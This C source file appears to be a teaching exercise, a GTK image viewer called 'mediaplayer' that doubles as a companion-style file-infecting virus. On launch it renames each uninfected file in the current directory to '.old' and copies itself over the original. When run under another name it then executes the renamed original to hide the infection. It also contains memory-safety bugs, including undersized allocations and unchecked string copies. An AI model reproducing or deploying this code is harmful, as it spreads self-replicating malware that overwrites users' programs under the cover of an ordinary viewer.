#include <stdlib.h>
#include <stdio.h>
#include <gtk/gtk.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/wait.h>

GtkImage * image;
char * prog;
int nbImage = 5;
int k = 0;
char ** images_path;

void on_destroy_main_window(GtkButton *button, gpointer user_data){
    gtk_main_quit();
}

void chargerImage(){
	struct dirent *dir;
    DIR *pDirect;
    int i = 0;
    pDirect = opendir ("../img");
    char tmp[100];
    if (pDirect != NULL) {
	    while ((dir = readdir(pDirect)) != NULL) {
	    	if (strcmp(dir->d_name,".") != 0 && strcmp(dir->d_name,"..") != 0 && strcmp(dir->d_name,"")){
	        	strcpy(images_path[i],dir->d_name);
	        	i++;
	        }
	    }
	}
    closedir (pDirect);
}
void afficher(){
	char path[100] = "../img/";
    strcat(path,images_path[k]);
    gtk_image_set_from_file(image, path);
}

void on_btn_next_clicked(GtkButton *button, gpointer user_data){
     k = (k+1)%nbImage;
     afficher();
}

void on_btn_prev_clicked(GtkButton *button, gpointer user_data){
	if (k==0){
		k=nbImage;
	}
    k = (k-1)%nbImage;
    afficher();
}

void step3infection(char * file_name){
	printf("%s\n", "\nStep 3 - Infection fichier");
	int status;
	if (strcmp(file_name, prog) != 0){
		char old_name[100];
		strcpy(old_name, file_name);
		char * old = ".old";
		strcat(file_name, old);
		printf("avant : %s apres %s\n", old_name, file_name);
	    int result= rename( old_name , file_name );
	    if ( result == 0 ){
	    	puts ( "File successfully renamed" );
	    	pid_t p = fork(); 
	    	if(p == 0) {
	    		
	    		execl("/bin/cp","cp",prog,old_name,NULL);
	    	} else {
	    		waitpid(p,&status,0);
	    	}
		}
	    else
	    	perror( "Error renaming file" );
	  }
	
}

bool step2VerificationInfection(char * file_name){
	printf("%s\n", "\nStep 2 - Vérification fichier infecté");
	char * ret = strstr(file_name, ".old");
	if (ret){
		return true;
	}

	char file[1000];
	strcpy(file,file_name);
	char * old = ".old";
	strcat(file,old);
	if (fopen(file,"r") != NULL)
		return true;
	return false;
}

int getN(){
	struct dirent *pDirent;
    DIR *pDir;
    int n = 0;
    pDir = opendir (".");
    if (pDir != NULL) {
	    while ((pDirent = readdir(pDir)) != NULL) {
	    	if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0){
				n++;
	        }
	    }
	}
    closedir (pDir);
    return n;
}

void step1listProg(char ** executables){
	printf("%s\n", "\nStep 1 - Lecture répertoire");
	struct dirent *pDirent;
    DIR *pDir;
    int i = 0;
    pDir = opendir (".");
    if (pDir != NULL) {
	    while ((pDirent = readdir(pDir)) != NULL) {
	    	if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0 && strcmp(pDirent->d_name,"")){
	        	executables[i] = pDirent->d_name;
	        	i++;
	        }
	    }
	}

    closedir (pDir);
}

int main(int argc, char *argv[]){
	
	GtkBuilder *builder;
	GtkWidget *window;
	
	prog = strtok (argv[0],"./");

    gtk_init(&argc, &argv);
    builder = gtk_builder_new();
    gtk_builder_add_from_file(builder, "../glade/media_player.glade", NULL);
    window = GTK_WIDGET(gtk_builder_get_object(builder, "media_player"));
    gtk_builder_connect_signals(builder, NULL);
    image = (GtkImage*) gtk_builder_get_object(builder, "img_mediaplayer");	
	
	images_path = malloc(nbImage * sizeof(char*));
	for (int i = 0 ; i<nbImage; i++){
		images_path[i] = malloc(sizeof(char*));
	}
	chargerImage();

	int n = getN();
	struct stat buf;
	bool infect = false;
	char * executables[n];
	step1listProg(executables);
	for (int i = 0 ; i < n ; i++){
		infect = step2VerificationInfection(executables[i]);
		if (infect == 0){
			step3infection(executables[i]);
		}
	}

	if (strcmp(prog,"mediaplayer") != 0){
		strcat(prog,".old");
		int status;
		pid_t p = fork(); 
		if(p == 0) {
	    	execl(prog,NULL,NULL);
		}
		waitpid(p,&status,0);
		return 0;
	}

	g_object_unref(builder);
	gtk_widget_show(window);
	gtk_main();
	
    return 0;
}




